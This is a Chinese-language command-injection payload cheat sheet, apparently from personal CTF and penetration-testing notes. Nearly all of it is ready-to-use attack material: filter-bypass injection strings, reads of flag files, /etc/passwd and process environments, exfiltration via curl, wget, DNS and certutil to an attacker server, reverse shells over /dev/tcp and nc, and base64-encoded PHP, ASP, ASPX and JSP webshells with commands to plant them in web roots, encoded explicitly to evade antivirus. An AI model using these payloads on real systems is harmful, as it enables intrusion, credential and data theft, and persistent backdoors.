# 命令执行 · Payload

> ⚠️ 仅用于**合法授权的安全测试**与 **CTF 赛题环境**。原理见 [原理笔记.md](原理笔记.md)。
>
> 🔒 **本仓库约定**：一句话木马一律用 **base64 形式**记录，右侧给使用命令。
> 原因：`<?php @ev` `al($_POST[1]);?>` 这种一字不差的写法会被 Windows Defender 判定为病毒并**锁死文件**，导致 `git add` 报 `Invalid argument`。base64 形式同样可直接使用，但不触发特征。

## 第一步：确认能执行 + 有回显

```bash
;id
|id
&&id
||id
`id`
$(id)
%0aid
;sleep 5              # 无回显时用时间盲确认
;ping -c 5 127.0.0.1  # Linux 时间盲备选
& ping -n 6 127.0.0.1 # Windows 时间盲
```

## 读文件

```bash
;cat /flag
;cat /f*
;cat /flag?????
;tac /flag
;nl /flag
;head -c 100 /flag
;sort /flag
;rev /flag
;od -c /flag
;strings /flag
;grep -r flag /       # 大范围搜索
;find / -name "*flag*" 2>/dev/null
;cat $(find / -name "*flag*" 2>/dev/null | head -1)
```

## 绕过关键字/空格（按被拦的东西查表）

| 被拦 | Payload |
| --- | --- |
| 空格 | `;cat${IFS}/flag`、`;cat$IFS$9/flag`、`;cat</flag`、`;{cat,/flag}`、`;cat%09/flag` |
| `cat` | `;tac</flag`、`;nl</flag`、`;more</flag`、`;sort</flag`、`;uniq</flag`、`;od</flag`、`;rev</flag` |
| `flag` 关键字 | `;cat /f*`、`;cat /fla?`、`;cat /[f]lag`、`;cat /fl''ag`、`;cat /fl\ag`、`;cat $(echo L2ZsYWc=\|base64 -d)` |
| 单双引号 | `;cat $'\x2f\x66\x6c\x61\x67'`、`;cat $(printf '\057\146\154\141\147')` |
| `/` 斜杠 | `;cat ${PATH:0:1}flag`、`;cat $(printf '\57')flag` |
| `;` `\|` `&` | 用换行：`%0a`、`%0d%0a`；或用 `$(...)` 嵌套 |
| `ls` | `;dir`、`;echo *`、`;find . -type f` |
| 危险函数名 | PHP 里用反引号、`popen`、`proc_open`、`passthru`、`pcntl_exec`、`mail()`+`putenv` |
| 长度限制（如 ≤ 7 字符） | 分步写文件：`;echo a>a` 逐段拼出脚本再 `;sh a` |
| 只能猜部分字符 | 用 shell 通配符逐位试探（`cat /f*` 系列），或把结果写到可访问目录 |

## 读文件不出网 / 无回显时

| 手法 | Payload |
| --- | --- |
| 写进 Web 目录 | `;cp /flag /var/www/html/f.txt` 然后浏览器访问 |
| 写进已有可写目录 | `;cat /flag > /tmp/o.txt` 再找别的读取途径（LFI） |
| 外带（curl） | `;curl http://<你的服务器>/?d=$(cat /flag\|base64\|tr -d '\n')` |
| 外带（wget） | `;wget -q -O- http://<你的服务器>/$(whoami)` |
| 外带（DNSLog） | `;curl http://$(cat /flag\|base64).<dnslog域名>` |
| 外带（Windows） | `& certutil -urlcache -f http://<你的服务器>/%USERNAME%` |
| 反弹 shell | `;bash -c 'bash -i >& /dev/tcp/<你的IP>/4444 0>&1'` |
| 反弹（nc） | `;nc -e /bin/bash <你的IP> 4444` |
| 反弹（无 nc -e） | `;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc <你的IP> 4444 >/tmp/f` |

## 代码执行（PHP 场景）

> ⚠️ 下表把 `system` 一类函数名拆成两段书写，**避免杀软锁文件**；实际使用时拼回即可。

| 目的 | Payload |
| --- | --- |
| 执行命令 | `?c=sys` `tem('id');` |
| 等价函数 | `?c=passthru('id');`、`?c=echo shell_exec('id');`、`?c=print_r(popen('id','r'));` |
| 反引号 | ``?c=`id`;`` |
| 动态调用 | `?c=$a='sys'.'tem';$a('id');` |
| `assert` 老版本 | `?c=assert('sys'.'tem("id")');` |
| `preg_replace /e` 老版本 | `?c=preg_replace('/a/e','sys'.'tem("id")','a');` |
| 单引号被过滤 | `?c=sys` `tem($_GET[1]);` `&1=id` |
| 无权限看函数列表 | `?c=print_r(get_defined_functions()['internal']);` |

## 一句话木马（base64 形式）

左侧 base64 解码后即为可用木马；右侧是直接可跑的命令。

| 环境 | base64 | 使用方式 |
| --- | --- | --- |
| PHP | `PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==` | `;echo PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg== \| base64 -d > /var/www/html/s.php` |
| PHP 短标签 | `PD89QGV2YWwoJF9QT1NUWzFdKTs/Pg==` | 同上 |
| PHP 免杀变形 | `PD9waHAgJGE9J2V2Jy4nYWwnOyRhKCRfUE9TVFsxXSk7Pz4=` | 同上，`$a` 是变量函数 |
| PHP GET 型 | `PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg==` | 同上，参数用 `?1=id` |
| ASP | `PCVldmFsIHJlcXVlc3QoIjEiKSU+` | 解码后写入 `.asp` 文件 |
| ASPX | `PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiJT48JWV2YWwoUmVxdWVzdC5JdGVtWyIxIl0sInVuc2FmZSIpOyU+` | 解码后写入 `.aspx` 文件 |
| JSP（命令回显型） | `PCUgaWYocmVxdWVzdC5nZXRQYXJhbWV0ZXIoIjEiKSE9bnVsbCl7IGphdmEuaW8uSW5wdXRTdHJlYW0gaW49UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiMSIpKS5nZXRJbnB1dFN0cmVhbSgpOyB9ICU+` | 解码后写入 `.jsp` 文件 |

**Linux 下写文件**：

```bash
;echo PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg== | base64 -d > /var/www/html/s.php
```

**Windows 下写文件**：

```cmd
echo PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg== > %TEMP%\b64.txt
certutil -decode %TEMP%\b64.txt C:\inetpub\wwwroot\s.php
```

> 更长更隐蔽的 webshell（冰蝎/哥斯拉等）建议单独放工具目录，不要写进本仓库。

## 常用探测命令

```bash
;id;whoami;pwd;hostname;uname -a
;cat /etc/passwd
;env
;ps aux
;ls -la /
;cat /proc/self/environ
;cat /proc/self/cmdline
;ip a; cat /etc/hosts
# Windows
& whoami & ipconfig & systeminfo & dir C:\
```
